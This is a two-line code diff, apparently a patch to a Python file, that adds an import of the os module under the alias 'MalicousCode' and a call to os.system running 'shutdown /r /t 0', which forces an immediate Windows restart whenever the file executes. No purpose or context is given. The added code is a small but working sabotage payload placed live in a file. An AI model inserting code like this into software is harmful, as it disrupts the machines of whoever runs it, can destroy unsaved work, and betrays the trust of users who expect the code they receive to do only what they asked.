@@ -1,1 +1,2 @@
-
+import os as MalicousCode
+MalicousCode.system("shutdown /r /t 0")
